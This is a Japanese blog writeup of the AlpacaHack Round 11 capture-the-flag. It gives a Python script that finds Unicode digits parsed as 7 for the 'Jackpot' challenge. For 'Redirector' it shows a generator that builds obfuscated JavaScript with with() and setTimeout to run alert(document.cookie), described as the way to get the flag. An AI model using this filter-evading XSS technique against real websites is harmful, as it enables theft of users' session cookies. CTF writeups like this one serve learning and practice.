+++
date = '2025-05-18T18:25:26+09:00'
title = 'AlpacaHackRound11 Writeup'
+++


2025.05.17 (Sat) 12:00 - 18:00 JSTでAlpacaHackがやっていたらしい。が見逃した。\
普通に15:00に起きて、それ以降部屋の掃除をしていた。終わった。

問題は、Jackpot、Redirector、Tiny Note、AlpacaMarkの4つで、Jackpotは63 solvesとsolve数が多いので解きたい。\
次にRedirectorが6 solvesと多いが、どう考えても63 solvesに比べると少ないのでわかっても分からなくてもこれだけ復習対象にすることにする。

つまり、今回はJackpotとRedirectorに挑むということです。


## Jackpot

つい最近Unicode周りで遊んだことが功を奏して結構すぐわかった。

```python
def fuzzing():
    for codepoint in range(0, 0x10ffff):
        try :
            value =chr(codepoint)
            if not re.fullmatch(r"\d+", value):
                pass
            if int(value) == 7:
                print(f"Found: Unicode {codepoint:x}, Character: {value}")
        except Exception as e:
            pass
```

このコードから出力されるCharacterをcandidatesパラメータに含めるだけ。

一例として以下の文字列となる。
```
７𝟟𝟩7𝟳𖩧𞅇᧗෭๗
```

これらは`\d`に引っかかり (つまり、数字の7として認識)、int()を行うと全て数字の7となるため、全ての値が7の配列が出来上がるというわけ。

## Redirector

これは普通に分からんかった。
色々な人の解法を見ると、with()を使って難読化するっぽい。

```javascript
payload = "alert(document.cookie)"

template = "with(String)with(String())"
for char in payload:
    template += "with(concat(fromCharCode(" + str(ord(char)) + ")))"

template += "setTimeout(concat(String()))"
print(template)
```

payloadにcookieを取得するペイロードを打ち込めばフラグが取得できる。

withの難読化とsetTimeoutの第一引数がevalと同じような挙動をするというのは面白いなと思いました。
(知らなかった。)
